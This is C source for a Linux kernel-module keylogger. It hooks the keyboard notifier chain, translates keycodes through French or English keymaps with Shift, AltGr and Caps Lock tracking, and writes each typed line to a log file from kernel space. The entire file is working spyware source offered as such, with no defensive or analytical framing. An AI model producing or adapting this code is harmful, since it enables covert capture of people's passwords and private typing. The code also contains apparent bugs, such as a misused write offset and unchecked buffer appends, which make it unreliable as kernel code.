#include "keylogger.h"

#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include <linux/workqueue.h>

static struct semaphore sem;
static int shiftKeyDepressed = 1;
static int altGrDepressed = 1;
static int capslockDepressed = 1;
static char save[512];

static struct file *filep;

static struct workqueue_struct *my_wq;

typedef struct {
    struct work_struct my_work;
    char *dt;
    int size;
} my_work_t;

my_work_t *work_keylogger, *work_start;

static int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

static void my_wq_function( struct work_struct *work)
{
    my_work_t *my_work = (my_work_t *)work;

    dbg("Keylogger: my_work.x %d %s\n", my_work->size, my_work->dt );

    file_write(filep,my_work->size,my_work->dt,my_work->size);

    kfree( (void *)my_work->dt );
    kfree( (void *)work );

    return;
}

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    if (code == KBD_KEYCODE)
    {
        if( param->value == 42 || param->value == 54 ) //shift_l shift_r
        {
            down(&sem);
            if(param->down)
                shiftKeyDepressed = 0;
            else
                shiftKeyDepressed = 1;
            up(&sem);
            return NOTIFY_OK;
        }
        else if( param->value == 100 ) //alt_gr
        {
            down(&sem);
            if(param->down)
                altGrDepressed = 0;
            else
                altGrDepressed = 1;
            up(&sem);
            return NOTIFY_OK;
        }

        if(param->down)
        {
            if( param->value == 58 ) //caps_lock
            {
                if(capslockDepressed == 1)
                    capslockDepressed = 0;
                else
                    capslockDepressed = 1;
            }
            // new line
            if(param->value == 28 || param->value == 96) {
                strncat(save,"\n", 1);
                if (my_wq) {
                    work_keylogger = (my_work_t *)kmalloc(sizeof(my_work_t), GFP_KERNEL);
                    if (work_keylogger) {
                        INIT_WORK( (struct work_struct *)work_keylogger, my_wq_function );
                        work_keylogger->size = strlen(save);
                        work_keylogger->dt = kmalloc(strlen(save)+1, GFP_KERNEL);
                        strncpy(work_keylogger->dt,save,strlen(save));
                        work_keylogger->dt[strlen(save)] = '\0';
                        queue_work( my_wq, (struct work_struct *)work_keylogger );
                    }
                }
                memset(save, '\0', sizeof(save));
            }
            else {
                down(&sem);
                if( KEYMAP == 1) {
                    if(shiftKeyDepressed == 0) {
                        strncat(save,keymapShift_fr[param->value], strlen(keymapShift_fr[param->value]));
                    }
                    else if(capslockDepressed == 0) {
                        strncat(save,keymapCaps_fr[param->value], strlen(keymapCaps_fr[param->value]));
                    }
                    else if(altGrDepressed == 0) {
                        strncat(save,keymapAlt_gr_fr[param->value], strlen(keymapAlt_gr_fr[param->value]));
                    }
                    else {
                        strncat(save,keymap_fr[param->value], strlen(keymap_fr[param->value]));
                    }
                }
                else {
                    if(shiftKeyDepressed == 0) {
                        strncat(save,keymapShift_en[param->value], strlen(keymapShift_en[param->value]));
                    }
                    else if(capslockDepressed == 0) {
                        strncat(save,keymapCaps_en[param->value], strlen(keymapCaps_en[param->value]));
                    }
                    else if(altGrDepressed == 0) {
                        strncat(save,keymapAlt_gr_en[param->value], strlen(keymapAlt_gr_en[param->value]));
                    }
                    else {
                        strncat(save,keymap_en[param->value], strlen(keymap_en[param->value]));

                    }
                }
                up(&sem);
            }
        }
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_notify
};

void keylogger_init(void)
{
    int ret;

    my_wq = create_workqueue("my_queue");
    if ( ! (filep = filp_open(FILE_KEY, O_WRONLY | O_CREAT | O_APPEND, 0)) ) {
       dbg("Keylogger: Error open the file\n");
       return;
    }

    work_start = (my_work_t *)kmalloc(sizeof(my_work_t), GFP_KERNEL);
    if (work_start) {

        INIT_WORK( (struct work_struct *)work_start, my_wq_function );
        work_start->size = strlen("Starting keylogger\n");
        work_start->dt = kmalloc(strlen("Starting keylogger\n")+1, GFP_KERNEL);
        strncpy(work_start->dt,"Starting keylogger\n",strlen("Starting keylogger\n"));
        work_start->dt[strlen("Starting keylogger\n")] = '\0';
        ret = queue_work( my_wq, (struct work_struct *)work_start );

    }

    register_keyboard_notifier(&keylogger_nb);
    printk("Keylogger: Registering the keylogger module with the keyboard notifier list\n");
    sema_init(&sem, 1);
}

void keylogger_release(void)
{
    flush_workqueue( my_wq );
    destroy_workqueue( my_wq );
    unregister_keyboard_notifier(&keylogger_nb);
    printk("Keylogger: Unregistered the keylogger module \n");
    filp_close(filep, NULL);
}